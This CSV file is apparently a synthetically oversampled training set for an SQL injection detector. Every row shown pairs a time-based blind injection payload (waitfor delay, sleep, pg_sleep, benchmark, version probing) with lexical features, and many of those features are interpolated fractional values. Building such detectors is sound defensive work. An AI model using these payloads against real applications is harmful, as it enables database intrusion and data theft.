id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_001689,attack,time,"; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 8  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000037,0.041424899798574145,100.0,33.75511540418493,4.0859650668195115,39.0,7.0,35.0,19.0,0.39,0.07,0.35,0.19,2.0,0.0,2.0,0.0,0.0,0.0,1.0,6.0,1.3877787807814457e-17,0.0,2.0,4.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_001690,attack,time,or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000019,0.8681853489082932,30.933143050768805,15.786628610153763,3.2148533737940124,11.0,0.0,12.146514440615046,7.786628610153762,0.35733266949252673,1.3877787807814457e-17,0.3906916694903785,0.2519756610170948,0.7866286101537618,0.0,0.0,0.0,0.0,0.7866286101537616,0.0,2.0,1.3877787807814457e-17,4.0,0.0,0.7866286101537616,0.7866286101537616,0.0,0.0,0.21337138984623819,0.0,0.7866286101537617,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001691,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,0.9714316165059954,30.937524929548914,15.762514957729348,3.428708365959674,12.175009971819565,0.5875049859097832,9.175009971819563,9.0,0.3934929707639716,0.01780318139120554,0.295887532223546,0.29281631562127686,1.1102230246251565e-16,0.0,2.0,0.0,0.0,0.0,0.0,2.0,1.3877787807814457e-17,5.0,0.0,2.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.5875049859097822,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.5875049859097823
SMOTE_001692,attack,time,"1%'   )    )     )   and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000066,1.033854659382515,87.42757125231006,27.572428747689944,3.5041350937765814,17.496499383085194,21.427571252310052,37.35864312153492,11.14485749537989,0.19983912001697673,0.24502385414599814,0.42747697843029264,0.12766004740673248,0.7862143738449724,0.0,0.0,0.0,0.0,1.0,0.0,6.786214373844972,0.7862143738449723,0.0,1.0,0.9999999999999999,0.7862143738449724,0.0,0.0,0.7862143738449723,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.2137856261550276,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.2137856261550275
SMOTE_001693,attack,time," or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000039,0.5473129568204834,53.45462015658936,20.0,3.1998301380370515,13.0,10.68594362212824,23.1405637787176,6.62811275574352,0.24527538949650435,0.20239224897833738,0.4288314051816698,0.12350095634348847,1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,4.62811275574352,1.3877787807814457e-17,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001694,attack,time,""" or sleep  (  __TIME__  )  #",nearest_attack_euclidean,R000030,0.5823080275469743,28.13106443778875,15.478638662673252,3.333013872429593,10.6524257751155,0.0,9.6524257751155,7.82621288755775,0.3785612624463696,1.3877787807814457e-17,0.342830033190319,0.2786087043633114,1.1102230246251565e-16,0.8262128875577504,0.0,0.0,0.0,0.0,0.0,2.0,1.3877787807814457e-17,4.0,0.0,0.0,0.0,0.8262128875577504,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.8262128875577504,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.8262128875577504
SMOTE_001695,attack,time,"""  )  ;waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000009,1.5351643069703322,40.51145368331332,23.709287806942775,4.128287796831773,16.0,2.0,9.092878069427769,13.418575613885555,0.4032789354168941,0.05040986692711176,0.21161164123228832,0.33469955642370586,2.0,1.0,2.0,0.0,0.0,0.0,1.0,1.4185756138855536,1.3877787807814457e-17,4.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.7092878069427768,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001696,attack,time,pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000015,1.094844846540133,32.8730622518448,14.696151750263542,3.2347721940361436,11.696151750263544,0.0,11.480758751317715,9.696151750263544,0.3638508199294952,1.3877787807814457e-17,0.33543941073311023,0.3007097693373946,1.1102230246251565e-16,0.0,2.0,0.0,0.0,0.0,0.0,2.6961517502635433,1.3877787807814457e-17,5.0,0.0,2.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.34807587513177163,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.34807587513177163
SMOTE_001697,attack,time,"1""   )    )    as klie where 2840  =  2840 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000052,1.178811793012559,104.05100596868799,28.376474626634945,3.6713668889470514,26.960791044391577,26.168632835513264,40.5451074621482,10.376474626634945,0.25908627399823414,0.2517514757678794,0.3897970615092708,0.0993651887246157,1.1102230246251565e-16,0.7921582088783152,0.0,0.0,0.0,1.7921582088783152,0.0,6.0,1.3877787807814457e-17,0.0,1.0,1.792158208878315,0.0,0.792158208878315,0.0,0.792158208878315,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.2078417911216849,0.0,0.7921582088783151,0.0,0.20784179112168483,0.792158208878315,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001698,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   6866  =  6866",nearest_attack_euclidean,R000042,1.6008574729348455,94.3628379382302,26.846763884983716,3.6116354198372984,24.411273141639526,24.12901851331162,36.97578239829534,8.846763884983716,0.25866188483423047,0.25604841605341655,0.39202510462029005,0.09326459449206295,1.1102230246251565e-16,0.28225462832790504,0.0,0.0,0.0,1.282254628327905,0.0,6.0,1.3877787807814457e-17,0.0,1.0,1.2822546283279048,0.0,0.28225462832790504,0.0,0.282254628327905,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.717745371672095,0.0,0.28225462832790504,0.0,0.7177453716720948,0.28225462832790504,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001699,attack,time,"""  )   or sleep  (  __TIME__  )    =  """,nearest_attack_euclidean,R000012,0.029422225472964334,39.17790989794097,16.0,2.9958826310036986,11.0,0.0,18.152494198235118,10.025415699705853,0.28096041868598065,1.3877787807814457e-17,0.463068503661222,0.25597107765279736,1.1102230246251565e-16,2.0,0.0,0.0,0.0,1.0,0.0,3.025415699705853,1.3877787807814457e-17,4.0,0.0,0.9999999999999999,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001700,attack,time,"1'||  (  select 'svbf' where 7017  =  7017 or elt  (  6272  =  6272,sleep  (  5   )    )     )  ||'",nearest_attack_euclidean,R000073,2.666436761424991,106.25888488117144,29.62944244058572,3.8392301195022256,30.08121941682001,21.992386684644295,38.27411151188286,15.911167267824283,0.27982077924080256,0.2042769165536626,0.3638095687387078,0.15209273546682706,3.637055755941428,0.0,0.0,0.0,0.0,2.0,0.0,5.637055755941428,1.3877787807814457e-17,0.0,1.0,5.274111511882856,1.0,0.0,0.0,0.36294424405857206,0.0,1.0,1.0,0.0,0.0,0.36294424405857206,1.0,1.0,0.0,1.0,0.36294424405857206,0.36294424405857206,0.6370557559414279,0.0,0.0,0.0,0.0,0.0,0.0,0.6370557559414278,0.36294424405857206,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.362944244058572
SMOTE_001701,attack,time," or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000039,0.519861803097222,53.28054929840291,20.0,3.2052280553754486,13.0,10.701768245599736,22.982317544002647,6.59646350880053,0.24601733085926625,0.20327946557296878,0.42737865286297516,0.12332455070478984,1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,4.59646350880053,1.3877787807814457e-17,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001702,attack,time,1  )   or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000008,0.8014703126339565,34.0,15.167589835582142,2.9960790538494644,10.167589835582142,1.2081025411044646,15.248615246626786,7.375692376686606,0.299046759870063,0.03553242767954308,0.44848868372431727,0.21693212872607667,1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,3.2081025411044646,1.3877787807814457e-17,3.1675898355821426,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001703,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,2.3372051317562925,42.20768847602304,23.40256282534101,4.046497192941984,16.0,2.0,10.805125650682024,13.402562825341013,0.37953269644325466,0.04744158705540684,0.25550624551980744,0.31751947098153105,2.0,0.4025628253410129,2.0,0.0,0.0,0.0,0.4025628253410128,2.0,1.3877787807814457e-17,4.0,0.5974371746589872,2.0,1.0,0.4025628253410128,1.0,0.0,0.0,0.0,1.0,0.4025628253410128,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001704,attack,time,"""   )    )   ;waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000034,1.780225645398966,41.3732680635047,23.708140895944968,4.1019212894172465,16.0,2.0,9.956986271614767,13.416281791889933,0.3909270850544966,0.04886588563181208,0.2348234929798658,0.3253835363338255,2.0,0.7081408959449669,2.0,0.0,0.0,0.0,0.7081408959449669,1.7081408959449664,1.3877787807814457e-17,4.0,0.2918591040550331,2.0,1.0,0.7081408959449669,1.0,0.0,0.0,0.0,1.0,0.7081408959449669,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001705,attack,time,"1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000063,0.7541689298073251,66.93723785225198,20.258816222393712,2.972475948380693,11.538553160703422,11.118947753238853,34.27973693830971,10.0,0.16895129113281235,0.16401475692734682,0.5161832862270688,0.15085066571277206,0.8601315308451434,0.13986846915485657,0.0,0.0,0.0,1.1398684691548566,0.0,5.860131530845143,1.3877787807814457e-17,0.0,1.0,1.1398684691548566,0.8601315308451434,0.13986846915485665,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.13986846915485673,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.1398684691548566
SMOTE_001706,attack,time,sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000041,1.0612726947641238,25.583659407151025,13.950195644290616,3.231441126249405,9.63346376286041,0.0,8.633463762860409,7.316731881430206,0.3763652236268543,1.3877787807814457e-17,0.33697392967161155,0.28666084670153413,1.1102230246251565e-16,0.31673188143020514,0.0,0.0,0.0,0.0,0.0,2.0,1.3877787807814457e-17,4.0,0.0,0.0,0.0,0.31673188143020514,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.31673188143020514,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.316731881430205
SMOTE_001707,attack,time,"1 or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000013,1.7414230536107367,60.53521894504486,21.153521894504486,3.306505479108474,14.53802919267265,13.460565683513458,25.38310217435427,7.153521894504486,0.2460360589396478,0.21808719427582302,0.4167056645937644,0.11917108219076483,1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.3845072981681621,0.0,4.769014596336324,1.3877787807814457e-17,0.0,1.0,0.3845072981681623,0.0,0.0,0.0,1.0,0.0,0.3845072981681621,1.0,0.0,0.0,0.384507298168162,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001708,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,0.6882091937407908,31.538842795285063,16.12330567717104,3.450695847104827,12.415537118114026,0.7077685590570137,9.415537118114027,9.0,0.39362312614616557,0.021447532092636765,0.29797001833864956,0.28695932342254804,1.1102230246251565e-16,0.0,2.0,0.0,0.0,0.0,0.0,2.0,1.3877787807814457e-17,5.0,0.0,2.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.7077685590570129,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.7077685590570129
SMOTE_001709,attack,time,"1'||  (  select 'svbf' where 7017  =  7017 or elt  (  6272  =  6272,sleep  (  5   )    )     )  ||'",nearest_attack_euclidean,R000073,1.7402346897001761,103.73746966794886,28.36873483397443,3.759079154746136,28.3162287675642,20.605608317371875,38.526253033205116,16.28937954980767,0.2703395217969726,0.19647574648983412,0.37427533598483154,0.15890939572836166,3.763126516602557,0.0,0.0,0.0,0.0,2.0,0.0,5.763126516602557,1.3877787807814457e-17,0.0,1.0,5.526253033205114,1.0,0.0,0.0,0.23687348339744296,0.0,1.0,1.0,0.0,0.0,0.23687348339744294,1.0,1.0,0.0,1.0,0.23687348339744302,0.23687348339744294,0.7631265166025569,0.0,0.0,0.0,0.0,0.0,0.0,0.7631265166025569,0.23687348339744294,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.236873483397443
SMOTE_001710,attack,time,"1 where 5466  =  5466 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000045,1.459567104026228,94.58616371158742,27.658616371158743,3.7945257409783903,23.305157299055598,28.341383628841264,33.95169822695245,8.987924556738113,0.24542765197533215,0.30335048523800456,0.35670923112628294,0.09451263166038032,1.1102230246251565e-16,0.3293081855793709,0.0,0.0,0.0,2.0,0.0,4.658616371158741,1.3877787807814457e-17,0.0,1.0,2.0,0.0,0.32930818557937086,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.670691814420629,0.3293081855793709,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001711,attack,time,1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000049,0.4809129409927114,79.55877256773141,22.889693141932852,3.212141839168631,20.39808922303734,11.016792162208974,38.01679216220897,10.127099020276122,0.2548884238567739,0.13685329942441393,0.47995971904375256,0.1282985576750596,1.1102230246251565e-16,0.0,2.0,0.0,0.0,1.1270990202761215,0.0,6.0,1.3877787807814457e-17,1.0,0.0,3.1270990202761215,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.12709902027612163,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.1270990202761215
SMOTE_001712,attack,time,"   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000038,0.10629976560264476,61.48805237266363,20.0,2.978951071208516,13.0,10.488052372663628,30.0,8.0,0.21143715472114563,0.17051577763242862,0.4879318955103361,0.13011517213608964,1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,6.0,1.3877787807814457e-17,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001713,attack,time,"; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 0  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000007,0.0003387172275429432,100.0,33.0,4.063468620090547,39.0,7.0,35.0,19.0,0.39,0.07,0.35,0.19,2.0,0.0,2.0,0.0,0.0,0.0,1.0,6.0,1.3877787807814457e-17,0.0,2.0,4.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_001714,attack,time,"1""  )   as xioc where 7260  =  7260 or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000075,2.0803972308534933,88.72714698144546,27.467550431222076,3.615738670444612,22.064899137555848,18.0,36.79867435316689,11.863573490722732,0.24851412241020704,0.20379219897017012,0.41565181564909665,0.13204186297052617,1.0648991375558474,0.7337752156110383,0.0,0.0,0.0,2.0,0.0,5.266224784388962,1.3877787807814457e-17,0.0,1.0,3.064899137555847,0.26622478438896185,0.7337752156110382,0.0,0.7337752156110382,0.0,1.0,1.0,0.0,0.0,0.0,0.26622478438896185,0.2662247843889619,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.266224784388962
SMOTE_001715,attack,time,1'  )   where 7629  =  7629 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R000058,3.304539005341252,118.06146270782459,30.96186632241953,3.579631829714177,42.69493057935623,10.0,50.442799483629294,14.923732644839058,0.35846199692431746,0.08550577806770339,0.4300767700981258,0.12595545490985333,1.961866322419529,0.0,0.0,0.0,1.0,1.0,0.0,9.0,1.3877787807814457e-17,0.0,0.0,2.9618663224195294,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.4809331612097646,2.480933161209764,0.0,1.0,1.4809331612097647,0.48093316120976465,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.442799483629294
SMOTE_001716,attack,time,select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn,nearest_attack_euclidean,R000057,1.5391926751304232,51.4660456122613,16.822902843070523,3.1605887477449013,22.70306279381736,1.2942742892323693,20.35153139690868,7.117177132302892,0.4242658550998522,0.03074753319445206,0.4034262552325327,0.141560356473163,2.411451421535262,0.0,0.0,0.0,0.0,0.0,0.0,3.705725710767631,1.3877787807814457e-17,0.705725710767631,0.0,0.0,1.0,0.0,0.0,0.294274289232369,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.705725710767631,0.0,0.0,0.0,0.705725710767631,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.294274289232369,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.705725710767631
SMOTE_001717,attack,time,a' waitfor delay '0:0:10'--,nearest_attack_euclidean,R000011,1.687806064083549,28.319930001429363,19.31993000142936,4.11662139726457,13.855944001143488,3.608041999142384,2.536013999714129,8.31993000142936,0.4868677220999732,0.13301419599324465,0.09178234986138867,0.28833573204539353,2.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,1.3877787807814457e-17,1.8559440011434878,0.463986000285872,2.0,1.0,0.0,1.0,0.0,0.0,0.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001718,attack,time,"1"" where 7739  =  7739 and sleep  (  5  )  --",nearest_attack_euclidean,R000069,0.7580673903082926,48.644357585621876,21.520622512231697,3.575896169157031,13.390466884173772,11.041245024463393,17.822178792810938,6.390466884173772,0.2798156350608022,0.22539191788268914,0.36276661318311787,0.13202583387339073,0.13015562805792413,0.8698443719420761,1.7396887438841517,0.0,0.0,1.1301556280579241,0.0,2.260311256115848,1.3877787807814457e-17,0.0,0.13015562805792402,2.869844371942076,0.13015562805792402,0.8698443719420759,0.8698443719420759,0.13015562805792402,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001719,attack,time,or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000022,0.36190484669972334,28.719379239152182,15.245625605593169,3.2883080829930607,11.0,0.24562560559316982,10.228128027965848,7.24562560559317,0.3868048239317276,0.007224282517446168,0.35259808671318976,0.2533728068376364,1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,2.2456256055931694,1.3877787807814457e-17,4.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
